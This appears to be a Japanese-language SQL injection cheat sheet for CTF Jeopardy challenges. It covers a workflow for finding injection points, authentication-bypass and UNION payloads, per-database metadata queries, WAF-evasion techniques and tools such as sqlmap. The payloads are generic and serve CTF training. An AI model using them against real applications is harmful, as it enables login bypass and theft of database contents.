# SQLi (CTF Jeopardy)

## Jeopardy典型パターン

| 問題の特徴 | 攻撃種類 | 目標 |
|-----------|---------|------|
| ログインフォーム | Auth bypass | `' OR 1=1--` |
| 検索機能 | UNION | flagテーブル読み出し |
| エラー非表示 | Blind (Boolean/Time) | 1文字ずつ抽出 |
| フィルタあり | WAF bypass | コメント/大小文字 |

## Skill
- Entry探索：params/body/json/header/cookie、型とエスケープ境界の把握
- Error/Union/Boolean/Time-based を状況で切替
- DB特有：MySQL/Postgres/SQLite/MSSQL の関数・メタデータ参照
- WAF回避：コメント/大小/演算子分割/エンコード/キーワード分割

## Jeopardy Workflow
```
1. 入力点特定: ?id=1 → ?id=1' でエラー確認
2. DB種類判定: エラーメッセージ or バージョン関数
3. 列数特定: ORDER BY N / UNION SELECT NULL,...
4. 出力位置特定: UNION SELECT 1,2,3,... でどこが表示されるか
5. 情報抽出: テーブル一覧 → カラム一覧 → flag読み出し
```

## Quick Payloads

### Auth Bypass
```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
```

### UNION Injection
```sql
-- 列数特定
' ORDER BY 5--
' UNION SELECT NULL,NULL,NULL--

-- MySQL: テーブル一覧
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MySQL: カラム一覧
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='flag'--

-- MySQL: データ抽出
' UNION SELECT flag,NULL FROM flag--
```

### DB別メタデータ
```sql
-- MySQL
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='x'

-- SQLite
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='x'

-- PostgreSQL
SELECT tablename FROM pg_tables
SELECT column_name FROM information_schema.columns WHERE table_name='x'
```

## Minimal Checklist
1. `' " )` で構文崩れるか
2. UNION列数/型合わせ
3. blindなら比較軸（len/ascii/substr）を最短化
4. **flagテーブルは `flag`, `flags`, `secret`, `users` など**

## Tools
- 手動payload (Burp Repeater)
- `web_scanner.py` (本リポジトリ)
- sqlmap（最終手段、CTFでは手動推奨）
